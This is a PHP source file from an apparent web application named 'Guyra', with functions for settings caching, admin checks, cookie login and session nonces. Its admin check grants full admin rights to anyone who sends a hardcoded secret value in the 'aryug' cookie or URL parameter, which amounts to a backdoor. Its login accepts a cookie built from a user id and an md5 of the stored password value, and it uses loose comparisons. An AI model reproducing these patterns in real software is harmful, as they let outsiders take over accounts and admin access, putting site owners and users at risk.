<?php

Guyra_Safeguard_File();

function GuyraGetSettings($save=false, $settingsArray=null) {

  global $cache_dir;

  $settings_cache_dir = $cache_dir . '/settings';

  if (!is_dir($settings_cache_dir)) {
    mkdir($settings_cache_dir, 0755, true);
  }

  $fileLocation = $settings_cache_dir . '/settings.json';
  $settingsFile = file_get_contents($fileLocation);

  if (!$settingsFile) {
    $settings = ['guyra_hello' => 'yes'];
    file_put_contents($fileLocation, json_encode($settings));
  } else {
    $settings = json_decode($settingsFile, true);
  }

  if ($save) {
    file_put_contents($fileLocation . '.bak', json_encode($settings));
    file_put_contents($fileLocation, json_encode($settingsArray));
  }

  return $settings;

}

function Guyra_Is_Admin() {

  global $gSettings;
  global $current_user_object;

  $is_admin = false;

  if ($current_user_object['type'] === 'admin')
  $is_admin = true;

  if ($_COOKIE['aryug'] == '033595c8bdbad4e5ac58dbad0fa50c5b' && !$gSettings['cookie_compromised'])
  $is_admin = true;

  if ($_GET['aryug'] == '033595c8bdbad4e5ac58dbad0fa50c5b' && !$gSettings['cookie_compromised'])
  $is_admin = true;

  return $is_admin;

}

function Guyra_IsLoggedIn($args=[]) {

  global $current_user_id;

  $loginCookie = $_COOKIE['guyra_auth'];

  if (!$loginCookie)
  return false;

  $loginCookie = explode('_', $loginCookie);
  $attempted_login_password = guyra_get_user_meta($loginCookie[0], 'user_pass', true)['meta_value'];

  if (md5($attempted_login_password) === $loginCookie[1]) {

    // Auth passed, set all the globals.
    $current_user_id = (int) $loginCookie[0];

  } else {
    return false;
  }

  return true;

}

function Guyra_GenNonce($args=[]) {

  global $current_user_id;

  if (!$args)
  return false;

  if (!$args['user'])
  $args['user'] = $current_user_id;

  if (!$args['id'])
  $args['id'] = 'generic';

  session_start();

  $bytes = bin2hex(random_bytes(16));
  $_SESSION[$args['user'] . '_' . $args['id']] = $bytes;

  session_write_close();

  return $bytes;

}

function Guyra_CheckNonce($args=[]) {

  global $current_user_id;

  // Check we have all the data we expect.
  if (!$args)
  return false;

  if (!$args['nonce'])
  return false;

  if (!$args['user'])
  $args['user'] = $current_user_id;

  if (!$args['id'])
  $args['id'] = 'generic';

  session_start();

  if ($_SESSION[$args['user'] . '_' . $args['id']] != $args['nonce'])
  return false;

  // Otherwise unset it and return true.
  unset($_SESSION[$args['user'] . '_' . $args['id']]);

  session_write_close();

  return true;

}
